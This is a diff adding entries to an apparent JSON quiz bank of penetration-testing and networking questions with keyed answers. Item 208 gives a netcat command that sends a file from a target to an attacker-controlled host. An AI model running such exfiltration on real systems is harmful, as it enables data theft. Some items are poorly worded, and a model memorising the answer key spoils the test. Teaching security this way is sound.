+            "It is a MySQL server which states for a invalid keyword.",
+            "It is a Postgresql server which aiwts a keyword.",
+            "The keyword needs to be converted to char."
+        ]
+    },
+    "204": {
+        "question": "What kind of problem can arise when a HTTP-Proxy allows only using plain text?",
+        "answer": "There will be a problem if the form is not sent with \"application/x-www-form-urlencoded\".",
+        "incorrect": [
+            "There will be a problem if the form is not sent \"multipart/form-data\".",
+            "There will be a problem if the form is not sent \"application/json\".",
+            "There will be a problem if the form is not sent \"application/javascript\".",
+            "There will be a problem if the form is not sent \"image/jpeg\"."
+        ]
+    },
+    "205": {
+        "question": "Oracle introduced the PLSQLExclusionList, what answer is correct?",
+        "answer": "Direct attempts to access this package would result in a \"403 Forbidden\" response.",
+        "incorrect": [
+            "The exclusion list is accessible for the sa admin.",
+            "The exclusion list contains whitelisted entries.",
+            "The exclusion list can be used for privilege escalation.",
+            "The SYS can decide to either to whitelist/blacklist packages listed there."
+        ]
+    },
+    "206": {
+        "question": "In the last transaction by tracroute, the containing TTL answers ICMP Time Exceeded. What answer is true?",
+        "answer": "The Router decrements TTL values of packets by one when routing and discard packets whose TTL value has reached zero.",
+        "incorrect": [
+            "The Server sends an ICMP Time Exceeded message back to the source",
+            "The Server sends an ICMP Host Unreachable back to the source.",
+            "The Router sends an ICMP Host Unreachable back to the source.",
+            "The Client sends an ICMP Time Exceeded message back to the source."
+        ]
+    },
+    "207": {
+        "question": "What is the typical MTU for 1000Base-T Ethernet?",
+        "answer": "1500",
+        "incorrect": [
+            "1400",
+            "9000",
+            "1024",
+            "512"
+        ]
+    },
+    "208": {
+        "question": "in a pentest a file should be transfered from a server. The firewall allows all outgoing connection. How would the file be exfiltrated?",
+        "answer": "On your host run \"nc -l 80 > out.txt\", and on the target run \"type file.txt | nc <yourhost> 80\"",
+        "incorrect": [
+            "On your host run \"type file.txt | nc -l 80\", and on the target run \"nc -l 80\"",
+            "On your host run \"nc -l 80 > out.txt\", and on the target run \"nc -r file.txt <yourhost> 80\"",
+            "On your host run \"nc <target> 80 > out.txt\", and on the target run \"nc -p file.txt -v 80\"",
+            "On your host run \"nc -r 80 > out.txt\", and on the target run \"more file.txt | nc -h <yourhost> -p 80\""
+        ]
+    },
+    "209": {
+        "question": "On which OSI layer is Ethernet?",
+        "answer": "Layer 2",
+        "incorrect": [
+            "Layer 7",
+            "Layer 3",
+            "Layer 4",
+            "Layer 5"
+        ]
+    },
+    "210": {
+        "question": "Where on the OSI Layer is UDP?",
+        "answer": "Transport Layer (4)",
+        "incorrect": [
+            "Data Link Layer (2)",
+            "Physical Layer (1)",
+            "Network Layer (3)",
+            "Session Layer (5)"
+        ]
+    },
+    "211": {
+        "question": "Where on the OSI Layer is TCP?",
+        "answer": "Transport Layer (4)",
+        "incorrect": [
+            "Data Link Layer (2)",
+            "Physical Layer (1)",
+            "Network Layer (3)",
+            "Session Layer (5)"
+        ]
+    },
+    "212": {
+        "question": "Where on the OSI Layer is HTTP?",
+        "answer": "Application Layer (7)",
+        "incorrect": [
+            "Data Link Layer (2)",
+            "Physical Layer (1)",
+            "Network Layer (3)",
+            "Session Layer (5)"
+        ]
+    },
+    "213": {
+        "question": "What is a CNAME?",
+        "answer": "Maps a hostname to hostname.",
+        "incorrect": [
+            "Maps a domain to a hostname.",
+            "Maps a domain to an IP.",
+            "Maps an IP to a hostname.",
+            "Maps an IP to domain."
+        ]
+    },
+    "214": {
+        "question": "On a Solaris system the following shows up:\n\nPort 32000 - open - ruserd\n\nWhich answer is correct?",
+        "answer": "It is possible to enumerate active users logged in to the system",
+        "incorrect": [
+            "It is possible to dump the remote /etc/passwd",
+            "It is possible to to enumerate an empty GCOS field",
+            "It is possible to list all services",
+            "It is possible to list users from remote /etc/master.passwd"
+        ]
+    },
+    "215": {
+        "question": "A client reports a breach of their source code. The customer is asking for remediation advice. What answers are true?\n\nA) The databse was dumped, therefore credentials have been leaked.\nB) All user credentials and seesion cookies could have been leaked. \nC) The attacker can gain further knowledge on application logical flaws.",
+        "answer": "A, B, C ",
+        "incorrect": [
+            "A, B",
+            "A",
+            "B, C",
+            "C"
+        ]
+    },
+    "216": {
+        "question": "What is a Thick client?",
+        "answer": "It is a networked computer system with most resources installed locally, rather than distributed over a network.",
+        "incorrect": [
+            "A computer that uses remote desktop sessions",
+            "A computer that holds the software and updates for the clients.",
+            "A computer always distributed over network.",
+            "A computer that provides network information to Thin clients."
+        ]
+    },
+    "217": {
+        "question": "Which port does \"NETBIOS Name Service\" use? ",
+        "answer": "137",
+        "incorrect": [
+            "135",
+            "138",
+            "139",
+            "445"
+        ]
+    },
+    "218": {
+        "question": "Which port does \"NETBIOS Datagram Service\" use?",
+        "answer": "138",
+        "incorrect": [
+            "135",
+            "137",
+            "139",
+            "445"
+        ]
+    },
+    "219": {
+        "question": "Which port does \"NETBIOS Session Service\" use?",
+        "answer": "139",
+        "incorrect": [
+            "135",
+            "137",
+            "138",
+            "445"
+        ]
+    },
+    "220": {
+        "question": "Which port does finger use?",
+        "answer": "79",
+        "incorrect": [
+            "49",
+            "69",
+            "161",
+            "123"
+        ]
+    },
+    "221": {
+        "question": "Which port does NTP use?",
+        "answer": "Port 123",
+        "incorrect": [
+            "Port 1234",
+            "Port 5432",
+            "Port 88",
+            "Port 161"
+        ]
+    },
+    "222": {
+        "question": "Which command is correct on Windows util \"nslookup\" to identify the version of bind?",
+        "answer": "nslookup -q=txt -class=CHAOS version.bind <TARGET>",
+        "incorrect": [
+            "dig -q=txt -class=CHAOS bind.version <TARGET>",
+            "IN class=VERSION -query=txt version.bind",
+            "IN  class=BIND -query=mx version.bind",
+            "IN class=TXT version.bind SOA CHAOS"
+        ]
+    },
+    "223": {
+        "question": "Which octet mask has the follwing directory drw-r-----?",
+        "answer": "640",
+        "incorrect": [
+            "755",
+            "777",
+            "700",
+            "211"
+        ]
+    },
+    "224": {
+        "question": "On Windows 2008 in Active Directory a new Password-Policy was introduced. Which of the following answers is true ? \n\nA) Uppercase for A to Z\nB) Lowercase for a to z\nC) Numeric value from 0 to 9\nD) Nonalphanumeric symbols such as \"!\", \"#\", \"%\", or \"&\"",
+        "answer": "3 out of 4 need to be set.",
+        "incorrect": [
+            "All (A,B,C,D) need to be set.",
+            "A and B need to be set.",
+            "A and C need o be set",
+            "A and D need to be set."
+        ]
+    }
+}
